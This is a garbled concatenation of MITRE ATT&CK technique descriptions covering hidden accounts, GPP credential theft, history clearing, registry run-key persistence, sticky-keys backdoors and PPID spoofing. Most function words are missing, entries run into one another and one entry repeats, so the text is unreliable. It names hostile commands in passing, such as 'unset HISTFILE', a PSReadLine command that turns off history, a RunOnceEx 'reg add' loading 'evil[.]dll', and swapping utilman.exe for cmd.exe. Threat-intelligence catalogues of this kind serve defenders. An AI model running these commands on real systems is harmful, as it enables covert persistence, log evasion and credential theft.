Adversaries <code>CreateAccessKey</code> API AWS <code>gcloud iam service-accounts create</code> command GCP add access account. target account permissions requesting account, adversary escalate privileges environment [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004)).(Citation: Rhino Security Labs AWS Privilege Escalation) adversary rely specific actions user gain execution. Users subjected social engineering execute malicious code by, example, malicious document file link. user actions typically observed follow-on behavior forms [Phishing](https://attack.mitre.org/techniques/T1566).

While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly Initial Access occur phases intrusion, adversary file shared directory user's desktop hoping user it. activity shortly [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).

Adversaries deceive users performing actions enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control adversary, downloading executing malware [User Execution](https://attack.mitre.org/techniques/T1204). example, tech support scams facilitated [Phishing](https://attack.mitre.org/techniques/T1566), vishing, forms user interaction. Adversaries combination methods, spoofing promoting toll-free centers direct victims malicious websites, deliver execute payloads malware [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery) adversary deface systems internal organization attempt intimidate mislead users, discrediting integrity systems. form modifications internal websites, user systems replacement desktop wallpaper.(Citation: Novetta Blockbuster) Disturbing offensive images [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) user discomfort, pressure compliance accompanying messages. internally defacing systems exposes adversary's presence, takes intrusion goals accomplished.(Citation: Novetta Blockbuster Destructive Malware) Adversaries hidden users hide presence user accounts create modify. Administrators hide users user accounts hide administrative management accounts users. 

In macOS, adversaries create modify user hidden manipulating plist files, folder attributes, user attributes. prevent user login screen Preferences, adversaries set userID 500 set key <code>Hide500Users</code> <code>TRUE</code> <code>/Library/Preferences/com.apple.loginwindow</code> plist file.(Citation: Cybereason OSX Pirrit) user userID it. <code>Hide500Users</code> key set <code>TRUE</code>, users userID 500 login screen Preferences. command line, adversaries <code>dscl</code> utility create hidden user accounts setting <code>IsHidden</code> attribute <code>1</code>. Adversaries hide user’s folder changing <code>chflags</code> hidden.(Citation: Apple Support Hide User Account) 

Adversaries hide user accounts Windows. Adversaries set <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList</code> Registry key <code>0</code> specific user prevent user listed logon screen.(Citation: FireEye SMOKEDHAM June 2021)(Citation: US-CERT TA18-074A)

On Linux systems, adversaries hide user accounts login screen, referred greeter. method adversary depends Display Manager distribution using. example, Ubuntu GNOME Display Manger (GDM), accounts hidden greeter <code>gsettings</code> command (ex: <code>sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true</code>).(Citation: Hide GDM User Accounts) Display Managers anchored specific distributions changed user adversary. Adversaries impersonate tokens escalate privileges bypass access controls. adversary username password user logged system, adversary create logon session user <code>LogonUser</code> function. function return session's access token adversary <code>SetThreadToken</code> assign token thread. Adversaries attempt unsecured credentials Policy Preferences (GPP). GPP tools administrators create domain policies embedded credentials. policies administrators set local accounts.(Citation: GPP 2016)

These policies stored SYSVOL domain controller. domain user view SYSVOL share decrypt password (using AES key public).(Citation: GPP Key)

The tools scripts gather decrypt password file Policy Preference XML files:

* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>
* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)
* gpprefdecrypt.py

On SYSVOL share, adversaries command enumerate potential GPP XML files: <code>dir /s * .xml</code>
 Windows Control Panel items utilities users view adjust settings. Control Panel items registered executable (.exe) Control Panel (.cpl) files, renamed dynamic-link library (.dll) files export CPlApplet function. (Citation: Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) Control Panel items executed command line, programmatically application programming interface (API) call, simply double-clicking file. (Citation: Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013)

For ease use, Control Panel items typically include graphical menus users registered loaded Control Panel. (Citation: Implementing CPL)

Adversaries Control Panel items execution payloads execute arbitrary commands. Malicious Control Panel items delivered [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) campaigns (Citation: TrendMicro CPL Malware Jan 2014) (Citation: TrendMicro CPL Malware Dec 2013) executed multi-stage malware. (Citation: Palo Alto Reaver Nov 2017) Control Panel items, CPL files, bypass application file extension whitelisting. Adversaries steal data exfiltrating asymmetrically encrypted network protocol existing command control channel. data alternate network location main command control server. 

Asymmetric encryption algorithms channel. public-key cryptography, requires pairs cryptographic encrypt/decrypt data key. communication channels requires private key (only procession entity) public key entity. public entity exchanged encrypted communications begin. 

Network protocols asymmetric encryption (such HTTPS/TLS/SSL) utilize symmetric encryption exchanged. Adversaries opt encrypted mechanisms baked protocol.  Adversaries attempt listing cloud accounts. Cloud accounts created configured organization users, remote support, services, administration resources cloud service provider SaaS application.

With authenticated access tools accounts. <code>Get-MsolRoleMember</code> PowerShell cmdlet account names role permissions Office 365.(Citation: msolrolemember)(Citation: GitHub Raindance) Azure CLI (AZ CLI) interface user accounts authenticated access domain. command <code>az user list</code> list users domain.(Citation: CLI)(Citation: Black Hills Red Teaming Azure, 2018) 

The AWS command <code>aws iam list-users</code> list users current account <code>aws iam list-roles</code> IAM roles path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) GCP, <code>gcloud iam service-accounts list</code> <code>gcloud projects get-iam-policy</code> listing service accounts users project.(Citation: Google Cloud - IAM Servie Accounts List API) Adversaries attempt running processes system. gain understanding common software/applications running systems network. Adversaries [Process Discovery](https://attack.mitre.org/techniques/T1057) automated discovery shape follow-on behaviors, including adversary infects target attempts specific actions.

In Windows environments, adversaries details running processes [Tasklist](https://attack.mitre.org/software/S0057) utility [cmd](https://attack.mitre.org/software/S0106) <code>Get-Process</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001). processes extracted output [Native API](https://attack.mitre.org/techniques/T1106) calls <code>CreateToolhelp32Snapshot</code>. Mac Linux, accomplished <code>ps</code> command. Adversaries opt enumerate processes /proc. Adversaries impair command history logging hide commands compromised system. command interpreters track commands users type terminal users retrace done. 

On Linux macOS, command history tracked file environment variable <code>HISTFILE</code>. user logs system, flushed file user's directory called <code>~/.bash_history</code>. <code>HISTCONTROL</code> environment variable track saved <code>history</code> command eventually <code>~/.bash_history</code> file user logs out. <code>HISTCONTROL</code> exist default macOS, set user respected.

Adversaries history environment variable (<code>unset HISTFILE</code>) set command history size (<code>export HISTFILESIZE=0</code>) prevent logging commands. Additionally, <code>HISTCONTROL</code> configured ignore commands start space simply setting "ignorespace". <code>HISTCONTROL</code> set ignore duplicate commands setting "ignoredups". Linux systems, set default "ignoreboth" covers previous examples. “ ls” saved, “ls” saved history. Adversaries abuse operate leaving traces simply prepending space terminal commands. 

On Windows systems, <code>PSReadLine</code> module tracks commands PowerShell sessions writes file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> default). Adversaries change logs saved <code>Set-PSReadLineOption -HistorySavePath {File Path}</code>. <code>ConsoleHost_history.txt</code> receiving logs. Additionally, logging file PowerShell command <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.(Citation: PowerShell Command History)(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)

Adversaries leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) network devices disable historical command logging (e.g. <code>no logging</code>). technique deprecated inaccurate usage. report cited provide technical malware interacted launchd services. services interact launchd launchd itself. 

Adversaries abuse <code>Launchd</code> daemon perform task scheduling initial recurring execution malicious code. <code>launchd</code> daemon, native macOS, responsible loading maintaining services operating system. process loads parameters launch-on-demand system-level daemon property list (plist) files <code>/System/Library/LaunchDaemons</code> <code>/Library/LaunchDaemons</code> (Citation: AppleDocs Launch Agent Daemons). LaunchDaemons property list files executables launched (Citation: Methods Mac Malware Persistence).

An adversary <code>launchd</code> daemon macOS environments schedule executables startup scheduled basis persistence. <code>launchd</code> abused process context account. Daemons, <code>launchd</code>, permissions root user account, operate user account logged in. Adversaries establish persistence elevate privileges executing malicious content triggered Windows Management Instrumentation (WMI) event subscription. WMI install event filters, providers, consumers, bindings execute code defined event occurs. Examples events subscribed wall clock time, user loging, computer's uptime.(Citation: Mandiant M-Trends 2015)

Adversaries capabilities WMI subscribe event execute arbitrary code event occurs, providing persistence system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries compile WMI scripts Windows Management Object (MOF) files (.mof extension) create malicious subscription.(Citation: Dell WMI Persistence)(Citation: MOF 2018)

WMI subscription execution proxied WMI Provider Host process (WmiPrvSe.exe) result elevated privileges. Adversaries search content delivery network (CDN) data victims targeting. CDNs organization host content distributed, load balanced array servers. CDNs organizations customize content delivery based requestor’s geographical region.

Adversaries search CDN data gather actionable information. Threat actors online resources lookup tools harvest content servers CDN. Adversaries seek target CDN misconfigurations leak sensitive intended hosted protection mechanisms (ex: login portals) content hosted organization’s website.(Citation: DigitalShadows CDN) sources reveal opportunities forms reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)). Adversaries employ user activity checks detect avoid virtualization analysis environments. include changing behaviors based checks presence artifacts indicative virtual machine environment (VME) sandbox. adversary detects VME, alter malware disengage victim conceal core functions implant. search VME artifacts dropping secondary additional payloads. Adversaries learned [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) automated discovery shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Adversaries search user activity host based variables speed/frequency mouse movements clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, files common directories desktop. methods rely specific user interaction malicious code activated, waiting document close activating macro (Citation: Unit 42 Sofacy Nov 2018) waiting user double embedded image activate.(Citation: FireEye FIN7 April 2017)  programs executed additional privileges current user context, common operating prompt user proper credentials authorize elevated privileges task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1088)).

Adversaries mimic functionality prompt users credentials seemingly legitimate prompt reasons mimic normal usage, fake installer requiring additional access fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) type prompt collect credentials languages [AppleScript](https://attack.mitre.org/techniques/T1155)(Citation: LogRhythm Trust Oct 2014)(Citation: OSX Keydnap malware) [PowerShell](https://attack.mitre.org/techniques/T1086)(Citation: LogRhythm Trust Oct 2014)(Citation: Enigma Phishing Credentials Jan 2015). Adversaries create accounts cloud providers targeting. Adversaries cloud accounts operations, including leveraging cloud storage services Dropbox, OneDrive, AWS S3 buckets [Exfiltration Cloud Storage](https://attack.mitre.org/techniques/T1567/002) [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts acquisition infrastructure, [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Establishing cloud accounts adversaries develop sophisticated capabilities managing servers.(Citation: Awake Security C2 Cloud)

Creating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) require adversaries establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002) register cloud provider.  Adversaries gain access third-party software suites installed enterprise network, administration, monitoring, deployment systems, laterally network. Third-party applications software deployment systems network environment administration purposes SCCM, HBSS, Altiris, etc.).

Access third-party network-wide enterprise-wide software enable adversary remote code execution systems connected system. access laterally systems, gather information, specific effect, wiping hard drives endpoints.

The permissions required action vary configuration; local credentials sufficient direct access third-party system, specific domain credentials required. However, require administrative account log perform intended purpose. Adversaries steal data exfiltrating existing command control channel. Stolen data encoded normal communications channel protocol command control communications. Adversaries spoof parent process identifier (PPID) process evade process-monitoring defenses elevate privileges. processes typically spawned parent, calling, process explicitly specified. explicitly assigning PPID process <code>CreateProcess</code> API call, supports parameter defines PPID use.(Citation: DidierStevens SelectMyParent Nov 2009) functionality Windows features User Account Control (UAC) correctly set PPID requested elevated process spawned (typically <code>svchost.exe</code> <code>consent.exe</code>) current user context.(Citation: UAC Nov 2018)

Adversaries abuse mechanisms evade defenses, blocking processes spawning Office documents, analysis targeting unusual/potentially malicious parent-child process relationships, spoofing PPID [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) <code>explorer.exe</code> Office document delivered [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) spoofing executed [Visual Basic](https://attack.mitre.org/techniques/T1059/005) malicious Office document code perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)

Explicitly assigning PPID enable elevated privileges access rights parent process. example, adversary privileged user context administrator) spawn process assign parent process running (such <code>lsass.exe</code>), causing process elevated inherited access token.(Citation: XPNSec PPID Nov 2017) Adversaries gather victim's organization targeting. organization include variety details, including names divisions/departments, specifics business operations, roles responsibilities key employees.

Adversaries gather ways, direct elicitation [Phishing Information](https://attack.mitre.org/techniques/T1598). organization exposed adversaries online accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak)(Citation: EDGAR Search) Gathering reveal opportunities forms reconnaissance (ex: [Phishing Information](https://attack.mitre.org/techniques/T1598) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) [Trusted Relationship](https://attack.mitre.org/techniques/T1199)). Adversaries achieve persistence adding program startup folder referencing Registry key. Adding entry "run keys" Registry startup folder program referenced executed user logs in. (Citation: Key) programs executed context user account's permissions level.

Placing program startup folder program execute user logs in. startup folder location individual user accounts system-wide startup folder checked user account logs in.

The startup folder path current user is:
* <code>C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>
The startup folder path users is:
* <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code>

The created default Windows systems:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code> created default Windows Vista newer. Registry key entries reference programs list dependency. (Citation: RunOnceEx APR 2018) example, load DLL logon "Depend" key RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)

The Registry set startup folder items persistence:
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Folders</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code>
* <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Folders</code>

The Registry control automatic startup services boot:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

Using policy settings startup programs creates values Registry keys:
* <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>
* <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

The Winlogon key controls actions occur user logs running Windows 7. actions control operating system, add custom actions here. <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> subkeys automatically launch programs.

Programs listed load registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> user logs on.

By default, multistring BootExecute registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> set autocheck autochk *. Windows, startup, check file-system integrity hard disks shut abnormally. Adversaries add programs processes registry automatically launch boot.

Adversaries configuration locations execute malware, remote access tools, maintain persistence reboots. Adversaries [Masquerading](https://attack.mitre.org/techniques/T1036) Registry entries legitimate programs. Adversaries forge credential materials gain access applications Internet services. applications services (hosted cloud SaaS environments on-premise servers) session cookies, tokens, materials authenticate authorize user access.

Adversaries generate credential materials gain access resources. differs [Steal Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), behaviors credentials forged adversary, stolen intercepted legitimate users. generation credentials requires secret values, passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator)

Once forged, adversaries credentials access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), bypass multi-factor authentication protection mechanisms.(Citation: Pass Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: SolarWinds Customer Guidance) Adversaries attempt bypass multi-factor authentication (MFA) mechanisms gain access accounts generating MFA requests users.

Adversaries possession credentials [Valid Accounts](https://attack.mitre.org/techniques/T1078) unable complete login process lack access 2FA MFA mechanisms required additional credential security control. circumvent this, adversaries abuse automatic generation push notifications MFA services Duo Push, Authenticator, Okta, services user grant access account.

In cases, adversaries continuously repeat login attempts bombard users MFA push notifications, SMS messages, phone calls, user finally accepting authentication request response “MFA fatigue.”(Citation: Russian 2FA Push Annoyance - Cimpanu)(Citation: MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting Government Business Entities Globe) Adversaries modify client software binaries establish persistent access systems. Client software enables users access services server. Common client software types SSH clients, FTP clients, email clients, browsers.

Adversaries modifications client software binaries carry malicious tasks applications use. example, adversary source code client software, add backdoor, compile target, replace legitimate application binary (or support files) backdoored one. applications routinely executed user, adversary leverage persistent access host. Adversaries abuse PowerShell commands scripts execution. PowerShell powerful interactive command-line interface scripting environment included Windows operating system.(Citation: TechNet PowerShell) Adversaries PowerShell perform actions, including discovery execution code. Examples include <code>Start-Process</code> cmdlet executable <code>Invoke-Command</code> cmdlet runs command locally remote (though administrator permissions required PowerShell connect remote systems).

PowerShell download executables Internet, executed disk memory touching disk.

A PowerShell-based offensive testing tools available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), PSAttack.(Citation: Github PSAttack)

PowerShell commands/scripts executed invoking <code>powershell.exe</code> binary interfaces PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed .NET framework Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: PSfromCsharp APR 2014) Shortcuts symbolic links referencing files programs executed shortcut clicked executed startup process. Adversaries shortcuts execute tools persistence. create shortcut indirection [Masquerading](https://attack.mitre.org/techniques/T1036) legitimate program. Adversaries edit target path replace existing shortcut tools executed intended legitimate program. Adversaries establish persistence executing malicious content triggered file type association. file opened, default program file (also called file association handler) checked. File association selections stored Windows Registry edited users, administrators, programs Registry access administrators built-in assoc utility.(Citation: Change Default Programs)(Citation: File Handlers)(Citation: Assoc Oct 2017) Applications modify file association file extension arbitrary program file extension opened.

System file associations listed <code>HKEY_CLASSES_ROOT\.[extension]</code>, <code>HKEY_CLASSES_ROOT\.txt</code>. entries handler extension located <code>HKEY_CLASSES_ROOT\\[handler]</code>. commands listed subkeys key <code>HKEY_CLASSES_ROOT\\[handler]\shell\\[action]\command</code>. example: 

* <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code>
* <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code>
* <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code>

The values listed commands executed handler file extension. Adversaries modify values continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012) Adversaries inject malicious code processes VDSO hijacking evade process-based defenses elevate privileges. Virtual dynamic shared object (vdso) hijacking method executing arbitrary code address space separate live process. 

VDSO hijacking involves redirecting calls dynamically linked shared libraries. Memory protections prevent writing executable code process [Ptrace Calls](https://attack.mitre.org/techniques/T1055/008). However, adversary hijack syscall interface code stubs mapped process vdso shared object execute syscalls map malicious shared object. code invoked redirecting execution flow process patched memory address references stored process' global offset table (which store absolute addresses mapped library functions).(Citation: ELF Injection 2009)(Citation: Backtrace VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)

Running code context process access process's memory, system/network resources, elevated privileges. Execution VDSO hijacking evade detection security products execution masked legitimate process.   **This technique deprecated used.**

Some adversaries split communications protocols. protocol inbound command control outbound data, allowing bypass firewall restrictions. split random simply avoid data threshold alerts communication. Adversaries communicate application layer protocols transferring files avoid detection/network filtering blending existing traffic. Commands remote system, commands, embedded protocol traffic client server. 

Protocols FTP, FTPS, TFTP transfer files common environments.  Packets produced protocols fields headers data concealed. Data concealed transferred files. adversary abuse protocols communicate systems control victim network mimicking normal, expected traffic.  Component Object Model (COM) Windows enable interaction software components operating system. (Citation: Component Object Model) Adversaries insert malicious code executed legitimate software hijacking references relationships persistence. Hijacking object requires change Windows Registry replace reference legitimate component component executed. component executed normal operation adversary's code executed instead. (Citation: GDATA Hijacking) adversary hijack objects frequently maintain consistent level persistence, break noticeable functionality avoid instability lead detection. Windows accessibility features launched key combination user logged (for example, user Windows logon screen). adversary modify programs launched command prompt backdoor logging system.

Two common accessibility programs <code>C:\Windows\System32\sethc.exe</code>, launched shift key pressed times <code>C:\Windows\System32\utilman.exe</code>, launched Windows + key combination pressed. sethc.exe program referred "sticky keys", adversaries unauthenticated access remote desktop login screen. (Citation: FireEye Hikit Rootkit)

Depending version Windows, adversary advantage features code integrity enhancements. versions Windows, replaced binary digitally signed x64 systems, binary reside <code>%systemdir%\</code>, protected Windows File Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) debugger method discovered potential workaround require accessibility feature binary replaced. Examples methods:

For simple binary replacement Windows XP Windows Server 2003/R2 later, example, program <code>C:\Windows\System32\utilman.exe</code>) replaced "cmd.exe" (or program backdoor access). Subsequently, pressing key combination login screen sitting keyboard connected [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076) replaced file executed privileges. (Citation: Tilbury 2014)

For debugger method Windows Vista Windows Server 2008 later, example, Registry key modified configures "cmd.exe," program backdoor access, "debugger" accessibility program "utilman.exe"). Registry modified, pressing key combination login screen keyboard connected RDP "debugger" program executed privileges. (Citation: Tilbury 2014)

Other accessibility features exist leveraged fashion: (Citation: DEFCON2016 Sticky Keys)

* On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
* Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
* Narrator: <code>C:\Windows\System32\Narrator.exe</code>
* Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
* App Switcher: <code>C:\Windows\System32\AtBroker.exe</code> Adversaries exploit software vulnerabilities attempt collect credentials. Exploitation software vulnerability occurs adversary takes advantage programming error program, service, operating software kernel execute adversary-controlled code. Credentialing authentication mechanisms targeted exploitation adversaries gain access credentials circumvent process gain access systems. MS14-068, targets Kerberos forge Kerberos tickets domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Exploitation credential access result Privilege Escalation depending process targeted credentials obtained. Adversaries gain persistence elevate privileges executing malicious content triggered Event Monitor Daemon (emond). Emond [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) accepts events services, runs simple rules engine, takes action. emond binary <code>/sbin/emond</code> load rules <code>/etc/emond.d/rules/</code> directory action explicitly defined event takes place.

The rule files plist format define name, event type, action take. examples event types include startup user authentication. Examples actions command send email. emond service launch file QueueDirectories path <code>/private/var/db/emondClients</code>, [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)

Adversaries abuse service writing rule execute commands defined event occurs, start user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries escalate privileges administrator root emond service executed root privileges [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service. Adversaries existing, legitimate external service sending commands compromised receiving return output service channel. Compromised systems leverage popular websites social media host command control (C2) instructions. infected systems opt send output commands C2 channel, including distinct service. Alternatively, compromised systems return output adversaries send instructions systems response.

Popular websites social media acting mechanism C2 cover likelihood hosts network communicating prior compromise. common services, offered Google Twitter, easier adversaries hide expected noise. service providers commonly SSL/TLS encryption, adversaries level protection. Adversaries gather victim's networks targeting. networks include variety details, including administrative data (ex: IP ranges, domain names, etc.) specifics topology operations.

Adversaries gather ways, direct collection actions [Active Scanning](https://attack.mitre.org/techniques/T1595) [Phishing Information](https://attack.mitre.org/techniques/T1598). networks exposed adversaries online accessible data sets (ex: [Search Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering reveal opportunities forms reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)). Adversaries exploit remote services gain unauthorized access internal systems network. Exploitation software vulnerability occurs adversary takes advantage programming error program, service, operating software kernel execute adversary-controlled code. A common goal post-compromise exploitation remote services lateral movement enable access remote system.

An adversary determine remote vulnerable state, [Network Service Discovery](https://attack.mitre.org/techniques/T1046) Discovery methods common, vulnerable software deployed network, lack patches vulnerabilities,  security software detect remote exploitation. Servers target lateral movement exploitation, endpoint systems risk provide advantage access additional resources.

There well-known vulnerabilities exist common services SMB (Citation: CIS Multiple SMB Vulnerabilities) RDP (Citation: NVD CVE-2017-0176) applications internal networks MySQL (Citation: NVD CVE-2016-6662) server services.(Citation: NVD CVE-2014-7169)

Depending permissions level vulnerable remote service adversary achieve [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068) result lateral movement exploitation well. Adversaries spoof parent process identifier (PPID) process evade process-monitoring defenses elevate privileges. processes typically spawned parent, calling, process explicitly specified. explicitly assigning PPID process <code>CreateProcess</code> API call, supports parameter defines PPID use.(Citation: DidierStevens SelectMyParent Nov 2009) functionality Windows features User Account Control (UAC) correctly set PPID requested elevated process spawned (typically <code>svchost.exe</code> <code>consent.exe</code>) current user context.(Citation: UAC Nov 2018)

Adversaries abuse mechanisms evade defenses, blocking processes spawning Office documents, analysis targeting unusual/potentially malicious parent-child process relationships, spoofing PPID [PowerShell](https://attack.mitre.org/techniques/T1086)/[Rundll32](https://attack.mitre.org/techniques/T1085) <code>explorer.exe</code> Office document delivered [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193).(Citation: CounterCept PPID Spoofing Dec 2018) spoofing executed VBA [Scripting](https://attack.mitre.org/techniques/T1064) malicious Office document code perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)

Explicitly assigning PPID enable [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) (given access rights parent process). example, adversary privileged user context administrator) spawn process assign parent process running (such <code>lsass.exe</code>), causing process elevated inherited access token.(Citation: XPNSec PPID Nov 2017) Keychains built-in macOS track users' passwords credentials services features WiFi passwords, websites, secure notes, certificates, Kerberos. Keychain files located <code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, <code>/Network/Library/Keychains/</code>. (Citation: Wikipedia keychain) <code>security</code> command-line utility, built macOS default, manage credentials.

To manage credentials, users additional credentials access keychain. adversary credentials login keychain, access credentials stored vault. (Citation: External DA, OS Way) default, passphrase keychain user’s logon credentials. Adversaries internal spearphishing gain access additional exploit users organization access accounts systems environment. Internal spearphishing multi-staged campaign email account owned controlling user's device installed malware compromising account credentials user. Adversaries attempt advantage trusted internal account increase likelihood tricking target falling phish attempt.(Citation: Trend Micro Phishing Starts 2017)

Adversaries leverage [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) internal spearphishing deliver payload redirect external capture credentials [Input Capture](https://attack.mitre.org/techniques/T1056) sites mimic email login interfaces.

